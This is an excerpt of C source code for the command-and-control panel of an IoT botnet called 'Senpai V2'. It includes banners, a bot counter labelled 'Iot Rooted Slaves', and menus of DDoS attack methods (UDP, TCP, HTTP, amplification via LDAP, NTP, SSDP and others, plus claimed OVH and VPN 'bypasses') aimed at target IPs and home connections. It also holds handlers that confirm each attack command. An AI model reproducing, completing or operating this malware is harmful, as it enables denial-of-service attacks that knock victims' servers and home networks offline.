...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; UwU Slaves %d  | %s   %c", '\033', BotsConnected(), accounts[find_line].username, '\007');
  ...
  sprintf(ascii_banner_line2,   "\e[1;35m     ███████╗███████╗███╗   ██╗██████╗  █████╗ ██╗\r\n");
  sprintf(ascii_banner_line3,   "\e[1;35m     ██╔════╝██╔════╝████╗  ██║██╔══██╗██╔══██╗██║\r\n");
  sprintf(ascii_banner_line4,   "\e[1;35m     ███████╗█████╗  ██╔██╗ ██║██████╔╝███████║██║\r\n");
  sprintf(ascii_banner_line5,   "\e[1;35m     ╚════██║██╔══╝  ██║╚██╗██║██╔═══╝ ██╔══██║██║\r\n");
  sprintf(ascii_banner_line6,   "\e[1;35m     ███████║███████╗██║ ╚████║██║     ██║  ██║██║\r\n");
  sprintf(ascii_banner_line7,   "\e[1;35m     ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝V2\r\n");
  sprintf(ascii_banner_line8,   "\e[1;36m       ﾚののズﾉ刀ム ｷの尺 ｲん乇 乃乇丂ｲ 丂乇刀ｱﾑﾉ \r\n");    
  sprintf(ascii_banner_line9,   "\e[1;34m     Slamming Everything For My \e[1;35mSenpai UwU       \r\n");
  ...
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
   ...
   if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33m Senpai \e[94m#\e[37m ", accounts[find_line].username);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "count") || strstr(buf, "Count") || strstr(buf, "COUNT") || strstr(buf, "bots") || strstr(buf, "BOTS")) {
				...
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[35mIot Rooted Slaves:   \e[32m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(ops,         "\e[35mAccounts Online:   \e[32m%d\r\n", OperatorsConnected, scannerreport);
  ...
  sprintf(hp6,  "\e[1;32m    ╔═══════════════════════════════════════════╗\r\n");
  sprintf(hp7,  "\e[1;36m    ║\e[34m-METHODS - Shows Normal DDoS Methods       \e[1;36m║\r\n");
  sprintf(hp8,  "\e[1;32m    ║\e[34m-API     - Shows All API Methods           \e[1;32m║\r\n");
  sprintf(hp9,  "\e[1;36m    ║\e[34m-IPHM    - Shows IP Header Methods         \e[1;36m║\r\n");
  sprintf(hp10, "\e[1;32m    ║\e[34m-SPECIAL - Shows Special DDoS Methods      \e[1;32m║\r\n");
  sprintf(hp11, "\e[1;36m    ║\e[34m-PORTS   - Shows A List Of Ports           \e[1;36m║\r\n");
  sprintf(hp12, "\e[1;32m    ║\e[34m-BOTS    - Shows Bot Count                 \e[1;32m║\r\n");
  sprintf(hp13, "\e[1;36m    ║\e[34m-STATUS  - Shows Owners Social Media       \e[1;36m║\r\n");
  sprintf(hp14, "\e[1;32m    ╚═══════════════════════════════════════════╝\r\n");
  ...
  sprintf(ls1,  "\e[1;31m ╔══════════════════════════════════════════╗╔═════════╗\r\n");
  sprintf(ls2,  "\e[1;32m ║\e[36m!* UDP [IP] [PORT] [TIME] 32 0 10         \e[1;32m║║\e[37mTCP FLAGS\e[1;32m║\r\n");
  sprintf(ls3,  "\e[1;31m ║\e[34m!* TCP [IP] [PORT] [TIME] 32 FLAGS 0 10   \e[1;31m║║   \e[31mSYN   \e[1;31m║\r\n");
  sprintf(ls4,  "\e[1;32m ║\e[36m!* STD [IP] [PORT] [TIME]                 \e[1;32m║║   \e[32mACK   \e[1;32m║\r\n");
  sprintf(ls5,  "\e[1;35m ║\e[34m!* FLUX [IP] [PORT] [TIME] 32 1024 1      \e[1;35m║║   \e[35mFIN   \e[1;35m║\r\n");
  sprintf(ls6,  "\e[1;36m ║\e[36m!* HTTPHEX GHP 80 / TIME POWER            \e[1;36m║║   \e[36mPSH   \e[1;36m║\r\n");
  sprintf(ls7,  "\e[1;35m ╠═══════════════════════╦══════════════════╣║   \e[35mRST   \e[1;35m║\r\n");
  sprintf(ls8,  "\e[1;36m ║\e[37m!* STOP = STOPS ATTACKS\e[1;33m║\e[36mBest Method: TCP  \e[1;36m║╚═════════╝\r\n");
  sprintf(ls9,  "\e[1;35m ╚═══════════════════════╩══════════════════╝           \r\n");
  ...
  sprintf(ls1,  "\e[1;32m ╔══════════════════════════════════════════╦══╗\r\n");
  sprintf(ls2,  "\e[1;31m ║\e[37m!* ZAP [IP] [PORT] [TIME]                 \e[1;33m║\e[1;31m<3\e[1;33m║\r\n");
  sprintf(ls3,  "\e[1;32m ║\e[37m!* 100UP [IP] [PORT] [TIME]               \e[1;33m╚══╣\r\n");
  sprintf(ls4,  "\e[1;31m ║\e[37m!* L7DROP [WEBSITE IP] [443] [60]            \e[1;33m║\r\n");
  sprintf(ls5,  "\e[1;32m ║\e[37m!* NUKE [HOME IP] [443/80] [TIME]            \e[1;33m║\r\n");
  sprintf(ls6,  "\e[1;31m ╚═════════════════════════════════════════════╝\r\n");
  ...
  sprintf(s2,    "\e[1;35m ╔════════════════╗         ╔════════════════╗    \r\n"); 
  sprintf(s3,    "\e[1;35m ║ \e[37mSenpai UwU Daddy  \e[1;33m║         ║   \e[37mTime: 300s   \e[1;35m║    \r\n");
  sprintf(s4,    "\e[1;35m ╠═══════╦╦═══════╣         ╚╗ \e[37mPurcend UwU  \e[1;35m╔╝    \r\n");
  sprintf(s5,    "\e[1;35m ║ \e[32mLDAP  \e[1;33m║║ \e[32mTFTP  \e[1;33m╠════════╗ ║  \e[31mDON'T SPAM  \e[1;35m║     \r\n");
  sprintf(s6,    "\e[1;35m ║ \e[32mNTP   \e[1;33m║║ \e[32mSSDP  \e[1;33m╠═══════╗║ ╚══════╦╦══════╝     \r\n");
  sprintf(s7,    "\e[1;35m ║ \e[32mSNMP  \e[1;33m║║ \e[32mTELNET\e[1;33m╠══════╗║║        ║║            \r\n");
  sprintf(s8,    "\e[1;36m ╚═══════╩╩═══════╝      ║║║        ║║            \r\n");
  sprintf(s9,    "\e[1;36m                         ║║║        ║║              \r\n");
  sprintf(s10,   "\e[1;36m          ╔══════════════╩╩╩════════╩╩════╗         \r\n");
  sprintf(s11,   "\e[1;36m          ║            \e[37mUsage:             \e[1;36m║         \r\n");
  sprintf(s12,   "\e[1;36m          ║\e[34m!* [METHOD] [IP] [PORT] [TIME] \e[1;36m║         \r\n");
  sprintf(s13,   "\e[1;36m          ╚═══════════════════════════════╝         \r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				...
				char ls2  [800];
				char ls3  [800];
				char ls4  [800]; //Made by purcend dont leak my source please I fixed the old one 
				char ls5  [800];
				char ls6  [800];

  sprintf(ls1,  "\e[1;34m ╔══════════════════════════════════════════╦══╗\r\n");
  sprintf(ls2,  "\e[1;34m ║\e[35m!* OVH [IP] [PORT] [TIME]                 \e[1;34m║\e[1;31m<3\e[1;34m║\r\n");
  sprintf(ls3,  "\e[1;34m ║\e[35m!* SLAP-OVH [IP] [PORT] [TIME] [1024]     \e[1;34m╚══╣\r\n");
  sprintf(ls4,  "\e[1;35m ║\e[34m!* VPN [IP] [PORT] [TIME] [1604]             \e[1;35m║\r\n");
  sprintf(ls5,  "\e[1;35m ║\e[34m!* NFO [IP] [PORT] [TIME] [1337]             \e[1;35m║\r\n");
  sprintf(ls6,  "\e[1;35m ╚═════════════════════════════════════════════╝\r\n");
...
//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK				
		...
		if(strstr(buf, "!* UDP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mUDP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mTCP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STD")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mSTD \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* FLUX")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mFLUX \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HTTPHEX")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mHTTPHEX \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* ZAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mZAP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* 100UP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33m100UP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* L7DROP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Attack With x86 \x1b[1;33mL7DROP \x1b[1;31mPutin Rules\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NUKE")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33m Senpai  \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* LDAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mLDAP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NTP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mNTP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SNMP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mSNMP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TFTP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mTFTP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SSDP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mSSDP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TELNET")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mTELNET - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SLAP-OVH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mOVH-KILLER V3 [Security Team] \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* OVH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mReaper API OVH Bypass \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* VPN")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33m1G / 5G VPN Bypass \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NFO")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33m Senpai \x1b[1;31m] Sending \x1b[1;33mNFO-RAPE [SenpaiV1 Method] \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
